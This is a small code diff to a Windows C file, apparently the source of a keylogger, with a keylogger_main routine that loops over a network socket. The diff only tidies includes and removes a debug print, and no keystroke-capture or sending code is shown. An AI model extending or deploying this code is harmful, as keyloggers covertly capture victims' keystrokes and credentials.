@@ -1,11 +1,8 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <unistd.h>
-#include <signal.h>
 #include <windows.h>
-
-#define FULL_KEYBOARD_KEY_NUMBER 104
+#include "keylogger.h"
 
 int keyloggerRunning = 0;
 
@@ -14,7 +11,6 @@ void change_active(int change) {
 }
 
 void keylogger_main(SOCKET socket) {
-        printf("in keylogger.c %d\n", keyloggerRunning);
     while (keyloggerRunning) {
         char buffer[1024];
         ZeroMemory(buffer, sizeof(buffer));
